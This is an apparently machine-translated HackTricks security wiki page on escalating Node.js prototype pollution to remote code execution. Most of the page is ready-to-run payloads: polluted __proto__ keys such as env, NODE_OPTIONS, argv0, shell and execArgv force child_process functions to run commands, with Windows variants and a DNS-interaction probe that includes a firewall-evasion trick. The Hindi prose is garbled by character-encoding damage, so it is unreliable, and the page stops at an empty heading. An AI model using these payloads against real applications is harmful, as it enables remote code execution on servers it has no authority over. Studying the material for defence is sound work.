# Prototype Pollution to RCE

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Vulnerable Code

‡§ï‡§≤‡•ç‡§™‡§®‡§æ ‡§ï‡§∞‡•á‡§Ç ‡§ï‡§ø ‡§è‡§ï ‡§Ö‡§∏‡§≤‡•Ä JS ‡§ï‡•Å‡§õ ‡§á‡§∏ ‡§§‡§∞‡§π ‡§ï‡§æ ‡§ï‡•ã‡§° ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∞‡§π‡§æ ‡§π‡•à:
```javascript
const { execSync, fork } = require('child_process');

function isObject(obj) {
console.log(typeof obj);
return typeof obj === 'function' || typeof obj === 'object';
}

// Function vulnerable to prototype pollution
function merge(target, source) {
for (let key in source) {
if (isObject(target[key]) && isObject(source[key])) {
merge(target[key], source[key]);
} else {
target[key] = source[key];
}
}
return target;
}

function clone(target) {
return merge({}, target);
}

// Run prototype pollution with user input
// Check in the next sections what payload put here to execute arbitrary code
clone(USERINPUT);

// Spawn process, this will call the gadget that poputales env variables
// Create an a_file.js file in the current dir: `echo a=2 > a_file.js`
var proc = fork('a_file.js');
```
## PP2RCE via env vars

**PP2RCE** ‡§ï‡§æ ‡§Æ‡§§‡§≤‡§¨ ‡§π‡•à **Prototype Pollution to RCE** (Remote Code Execution).

‡§á‡§∏ [**writeup**](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/) ‡§ï‡•á ‡§Ö‡§®‡•Å‡§∏‡§æ‡§∞ ‡§ú‡§¨ ‡§è‡§ï **process** ‡§ï‡•ã **`child_process`** ‡§∏‡•á ‡§ï‡§ø‡§∏‡•Ä ‡§µ‡§ø‡§ß‡§ø (‡§ú‡•à‡§∏‡•á `fork` ‡§Ø‡§æ `spawn` ‡§Ø‡§æ ‡§Ö‡§®‡•ç‡§Ø) ‡§ï‡•á ‡§∏‡§æ‡§• **spawn** ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§Ø‡§π ‡§µ‡§ø‡§ß‡§ø `normalizeSpawnArguments` ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞‡§§‡•Ä ‡§π‡•à ‡§ú‡•ã **‡§®‡§è env vars ‡§¨‡§®‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï prototype pollution gadget** ‡§π‡•à:
```javascript
//See code in https://github.com/nodejs/node/blob/02aa8c22c26220e16616a88370d111c0229efe5e/lib/child_process.js#L638-L686

var env = options.env || process.env;
var envPairs = [];
[...]
let envKeys = [];
// Prototype values are intentionally included.
for (const key in env) {
ArrayPrototypePush(envKeys, key);
}
[...]
for (const key of envKeys) {
const value = env[key];
if (value !== undefined) {
ArrayPrototypePush(envPairs, `${key}=${value}`); // <-- Pollution
}
}
```
Check that code you can see it's possible en **poison `envPairs`** just by **polluting** the **attribute `.env`.**

### **Poisoning `__proto__`**

{% hint style="warning" %}
‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø **`child_process`** ‡§™‡•Å‡§∏‡•ç‡§§‡§ï‡§æ‡§≤‡§Ø ‡§ï‡•á **`normalizeSpawnArguments`** ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡•á ‡§ï‡§æ‡§Æ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§§‡§∞‡•Ä‡§ï‡•á ‡§ï‡•á ‡§ï‡§æ‡§∞‡§£, ‡§ú‡§¨ ‡§ï‡•Å‡§õ ‡§ï‡•ã ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•á ‡§≤‡§ø‡§è **‡§è‡§ï ‡§®‡§Ø‡§æ env ‡§µ‡•á‡§∞‡§ø‡§è‡§¨‡§≤ ‡§∏‡•á‡§ü ‡§ï‡§∞‡§®‡•á** ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡•â‡§≤ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§Ü‡§™‡§ï‡•ã ‡§¨‡§∏ **‡§ï‡•Å‡§õ ‡§≠‡•Ä ‡§™‡•ç‡§∞‡§¶‡•Ç‡§∑‡§ø‡§§** ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•ã‡§§‡•Ä ‡§π‡•à‡•§\
‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§Ø‡§¶‡§ø ‡§Ü‡§™ `__proto__.avar="valuevar"` ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç, ‡§§‡•ã ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§è‡§ï ‡§µ‡•á‡§∞‡§ø‡§è‡§¨‡§≤ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§∂‡•Å‡§∞‡•Ç ‡§ï‡•Ä ‡§ú‡§æ‡§è‡§ó‡•Ä ‡§ú‡§ø‡§∏‡§ï‡§æ ‡§®‡§æ‡§Æ `avar` ‡§î‡§∞ ‡§Æ‡§æ‡§® `valuevar` ‡§π‡•ã‡§ó‡§æ‡•§

‡§π‡§æ‡§≤‡§æ‡§Ç‡§ï‡§ø, **env ‡§µ‡•á‡§∞‡§ø‡§è‡§¨‡§≤ ‡§ï‡•ã ‡§™‡§π‡§≤‡§æ ‡§π‡•ã‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è** ‡§Ü‡§™‡§ï‡•ã **`.env` ‡§µ‡§ø‡§∂‡•á‡§∑‡§§‡§æ ‡§ï‡•ã ‡§™‡•ç‡§∞‡§¶‡•Ç‡§∑‡§ø‡§§** ‡§ï‡§∞‡§®‡§æ ‡§π‡•ã‡§ó‡§æ ‡§î‡§∞ (‡§ï‡•á‡§µ‡§≤ ‡§ï‡•Å‡§õ ‡§µ‡§ø‡§ß‡§ø‡§Ø‡•ã‡§Ç ‡§Æ‡•á‡§Ç) ‡§µ‡§π ‡§µ‡•á‡§∞‡§ø‡§è‡§¨‡§≤ **‡§™‡§π‡§≤‡§æ** ‡§π‡•ã‡§ó‡§æ (‡§π‡§Æ‡§≤‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à)‡•§

‡§á‡§∏‡§≤‡§ø‡§è **`NODE_OPTIONS`** ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§π‡§Æ‡§≤‡•á ‡§Æ‡•á‡§Ç **`.env`** ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ **‡§®‡§π‡•Ä‡§Ç ‡§π‡•à**‡•§
{% endhint %}

{% code overflow="wrap" %}
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/pp2rce').toString())//"}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"

// Trigger gadget
var proc = fork('./a_file.js');
// This should create the file /tmp/pp2rec


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce\\\").toString())//"}}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec
```
{% endcode %}

### `constructor.prototype` ‡§ï‡•ã ‡§ú‡§º‡§π‡§∞‡•Ä‡§≤‡§æ ‡§¨‡§®‡§æ‡§®‡§æ
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.constructor.prototype.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/pp2rce2').toString())//"}
b.constructor.prototype.NODE_OPTIONS = "--require /proc/self/environ"

proc = fork('a_file.js');
// This should create the file /tmp/pp2rec2


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"constructor": {"prototype": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce2\\\").toString())//"}}}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec2
```
## PP2RCE via env vars + cmdline

‡§™‡§ø‡§õ‡§≤‡•á ‡§µ‡§æ‡§≤‡•á ‡§ï‡•á ‡§∏‡§Æ‡§æ‡§® ‡§è‡§ï ‡§™‡•á‡§≤‡•ã‡§° ‡§ï‡•Å‡§õ ‡§™‡§∞‡§ø‡§µ‡§∞‡•ç‡§§‡§®‡•ã‡§Ç ‡§ï‡•á ‡§∏‡§æ‡§• [**‡§á‡§∏ ‡§≤‡•á‡§ñ**](https://blog.sonarsource.com/blitzjs-prototype-pollution/)** ‡§Æ‡•á‡§Ç ‡§™‡•ç‡§∞‡§∏‡•ç‡§§‡§æ‡§µ‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§•‡§æ‡•§** ‡§Æ‡•Å‡§ñ‡•ç‡§Ø ‡§Ö‡§Ç‡§§‡§∞ ‡§π‡•à‡§Ç:

* **payload** ‡§ï‡•ã ‡§´‡§º‡§æ‡§á‡§≤ `/proc/self/environ` ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§∏‡•ç‡§ü‡•ã‡§∞ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§¨‡§ú‡§æ‡§Ø, ‡§á‡§∏‡•á **`/proc/self/cmdline`** ‡§ï‡•á **argv0** ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§∏‡•ç‡§ü‡•ã‡§∞ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§
* ‡§´‡§ø‡§∞, **`NODE_OPTIONS`** ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§´‡§º‡§æ‡§á‡§≤ `/proc/self/environ` ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§ï‡•á ‡§¨‡§ú‡§æ‡§Ø, ‡§Ø‡§π **`/proc/self/cmdline`** ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§

{% code overflow="wrap" %}
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/pp2rce2').toString())//"
b.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"

// Trigger gadget
var proc = fork('./a_file.js');
// This should create the file /tmp/pp2rec2


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce2\\\").toString())//"}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec
```
{% endcode %}

## DNS Interaction

‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§™‡•á‡§≤‡•ã‡§°‡•ç‡§∏ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á, NODE\_OPTIONS env var ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à ‡§ú‡§ø‡§∏‡•á ‡§π‡§Æ‡§®‡•á ‡§™‡§π‡§≤‡•á ‡§ö‡§∞‡•ç‡§ö‡§æ ‡§ï‡•Ä ‡§•‡•Ä ‡§î‡§∞ ‡§Ø‡§π ‡§™‡§§‡§æ ‡§≤‡§ó‡§æ‡§®‡§æ ‡§ï‡§ø ‡§ï‡•ç‡§Ø‡§æ ‡§Ø‡§π DNS ‡§á‡§Ç‡§ü‡§∞‡•à‡§ï‡•ç‡§∂‡§® ‡§ï‡•á ‡§∏‡§æ‡§• ‡§ï‡§æ‡§Æ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à:
```json
{
"__proto__": {
"argv0":"node",
"shell":"node",
"NODE_OPTIONS":"--inspect=id.oastify.com"
}
}
```
‡§Ø‡§æ, ‡§°‡•ã‡§Æ‡•á‡§® ‡§ï‡•á ‡§≤‡§ø‡§è WAFs ‡§∏‡•á ‡§™‡•Ç‡§õ‡§®‡•á ‡§∏‡•á ‡§¨‡§ö‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è:
```json
{
"__proto__": {
"argv0":"node",
"shell":"node",
"NODE_OPTIONS":"--inspect=id\"\".oastify\"\".com"
}
}
```
## PP2RCE vuln child\_process functions

‡§á‡§∏ ‡§Ö‡§®‡•Å‡§≠‡§æ‡§ó ‡§Æ‡•á‡§Ç ‡§π‡§Æ **`child_process` ‡§∏‡•á ‡§™‡•ç‡§∞‡§§‡•ç‡§Ø‡•á‡§ï ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§®** ‡§ï‡§æ ‡§µ‡§ø‡§∂‡•ç‡§≤‡•á‡§∑‡§£ ‡§ï‡§∞‡•á‡§Ç‡§ó‡•á ‡§§‡§æ‡§ï‡§ø ‡§ï‡•ã‡§° ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á ‡§î‡§∞ ‡§¶‡•á‡§ñ‡•á‡§Ç ‡§ï‡§ø ‡§ï‡•ç‡§Ø‡§æ ‡§π‡§Æ ‡§â‡§∏ ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡•ã ‡§ï‡•ã‡§° ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Æ‡§ú‡§¨‡•Ç‡§∞ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡•ã‡§à ‡§§‡§ï‡§®‡•Ä‡§ï ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:

<details>

<summary><code>exec</code> exploitation</summary>

{% code overflow="wrap" %}
```javascript
// environ trick - not working
// It's not possible to pollute the .env attr to create a first env var
// because options.env is null (not undefined)

// cmdline trick - working with small variation
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/exec-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = exec('something');

// stdin trick - not working
// Not using stdin

// Windows
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = exec('something');
```
{% endcode %}

</details>

<details>

<summary><strong><code>execFile</code> ‡§∂‡•ã‡§∑‡§£</strong></summary>
```javascript
// environ trick - not working
// It's not possible to pollute the .en attr to create a first env var

// cmdline trick - working with a big requirement
// Working after kEmptyObject (fix)
const { execFile } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execFile-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execFile('/usr/bin/node');

// stdin trick - not working
// Not using stdin

// Windows - not working
```
For **`execFile`** ‡§ï‡•á ‡§ï‡§æ‡§Æ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ø‡§π **‡§ú‡§º‡§∞‡•Ç‡§∞‡•Ä ‡§π‡•à ‡§ï‡§ø node** ‡§ï‡•ã ‡§ö‡§≤‡§æ‡§®‡§æ ‡§™‡§°‡§º‡•á ‡§§‡§æ‡§ï‡§ø NODE\_OPTIONS ‡§ï‡§æ‡§Æ ‡§ï‡§∞ ‡§∏‡§ï‡•á‡§Ç‡•§\
‡§Ö‡§ó‡§∞ ‡§Ø‡§π **node** ‡§ï‡•ã ‡§®‡§π‡•Ä‡§Ç ‡§ö‡§≤‡§æ ‡§∞‡§π‡§æ ‡§π‡•à, ‡§§‡•ã ‡§Ü‡§™‡§ï‡•ã ‡§Ø‡§π ‡§™‡§§‡§æ ‡§≤‡§ó‡§æ‡§®‡§æ ‡§π‡•ã‡§ó‡§æ ‡§ï‡§ø ‡§Ü‡§™ **‡§™‡§∞‡•ç‡§Ø‡§æ‡§µ‡§∞‡§£ ‡§ö‡§∞** ‡§ï‡•á ‡§∏‡§æ‡§• ‡§ú‡•ã ‡§ï‡•Å‡§õ ‡§≠‡•Ä ‡§ö‡§≤ ‡§∞‡§π‡§æ ‡§π‡•à, ‡§â‡§∏‡§ï‡•Ä **‡§ï‡§æ‡§∞‡•ç‡§Ø‡§µ‡§æ‡§π‡•Ä ‡§ï‡•ã ‡§ï‡•à‡§∏‡•á ‡§¨‡§¶‡§≤ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç** ‡§î‡§∞ ‡§â‡§®‡•ç‡§π‡•á‡§Ç ‡§∏‡•á‡§ü ‡§ï‡§∞‡•á‡§Ç‡•§

**‡§Ö‡§®‡•ç‡§Ø** ‡§§‡§ï‡§®‡•Ä‡§ï‡•á‡§Ç **‡§¨‡§ø‡§®‡§æ** ‡§á‡§∏ ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§ï‡•á ‡§ï‡§æ‡§Æ ‡§ï‡§∞‡§§‡•Ä ‡§π‡•à‡§Ç ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§Ø‡§π **‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à** ‡§ï‡§ø **‡§ú‡•ã ‡§ö‡§≤ ‡§∞‡§π‡§æ ‡§π‡•à** ‡§â‡§∏‡•á ‡§™‡•ç‡§∞‡•ã‡§ü‡•ã‡§ü‡§æ‡§á‡§™ ‡§™‡•ç‡§∞‡§¶‡•Ç‡§∑‡§£ ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á **‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á**‡•§ (‡§á‡§∏ ‡§Æ‡§æ‡§Æ‡§≤‡•á ‡§Æ‡•á‡§Ç, ‡§≠‡§≤‡•á ‡§π‡•Ä ‡§Ü‡§™ `.shell` ‡§ï‡•ã ‡§™‡•ç‡§∞‡§¶‡•Ç‡§∑‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡•á‡§Ç, ‡§Ü‡§™ ‡§â‡§∏ ‡§ö‡•Ä‡§ú‡§º ‡§ï‡•ã ‡§™‡•ç‡§∞‡§¶‡•Ç‡§∑‡§ø‡§§ ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞ ‡§∏‡§ï‡•á‡§Ç‡§ó‡•á ‡§ú‡•ã ‡§ö‡§≤ ‡§∞‡§π‡•Ä ‡§π‡•à)‡•§ 

</details>

<details>

<summary><code>fork</code> ‡§∂‡•ã‡§∑‡§£</summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/fork-environ').toString())//"}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = fork('something');

// cmdline trick - working
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
p = {}
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/fork-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = fork('something');

// stdin trick - not working
// Not using stdin

// execArgv trick - working
// Only the fork method has this attribute
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.execPath = "/bin/sh"
b.__proto__.argv0 = "/bin/sh"
b.__proto__.execArgv = ["-c", "touch /tmp/fork-execArgv"]
var proc = fork('./a_file.js');

// Windows
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.execPath = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = fork('./a_file.js');
```
{% endcode %}

</details>

<details>

<summary><strong><code>spawn</code> ‡§∂‡•ã‡§∑‡§£</strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// NOT working after kEmptyObject (fix) without options
const { spawn } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/spawn-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// cmdline trick - working with small variation (shell)
// NOT working after kEmptyObject (fix) without options
const { spawn } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/spawn-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// stdin trick - not working
// Not using stdin

// Windows
// NOT working after require(fix) without options
const { spawn } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"C:\\"}); //To work after kEmptyObject (fix)
```
{% endcode %}

</details>

<details>

<summary><strong><code>execFileSync</code> ‡§∂‡•ã‡§∑‡§£</strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/execFileSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = execFileSync('something');

// cmdline trick - working with small variation (shell)
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execFileSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execFileSync('something');

// stdin trick - working
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/execFileSync-stdin}\n'
var proc = execFileSync('something');

// Windows
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
p.__proto__.argv0 = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = execSync('something');
```
{% endcode %}

</details>

<details>

<summary><strong><code>execSync</code> ‡§∂‡•ã‡§∑‡§£</strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/execSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = execSync('something');

// cmdline trick - working with small variation (shell)
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execSync('something');

// stdin trick - working
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/execSync-stdin}\n'
var proc = execSync('something');

// Windows
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = execSync('something');
```
{% endcode %}

</details>

<details>

<summary><strong><code>spawnSync</code> ‡§∂‡•ã‡§∑‡§£</strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of node
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/spawnSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// cmdline trick - working with small variation (shell)
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/spawnSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// stdin trick - working
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/spawnSync-stdin}\n'
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)

// Windows
// NOT working after require(fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"C:\\"}); //To work after kEmptyObject (fix)
```
{% endcode %}

</details>

## ‡§´‡•ã‡§∞‡•ç‡§∏‡§ø‡§Ç‡§ó ‡§∏‡•ç‡§™‡•â‡§®

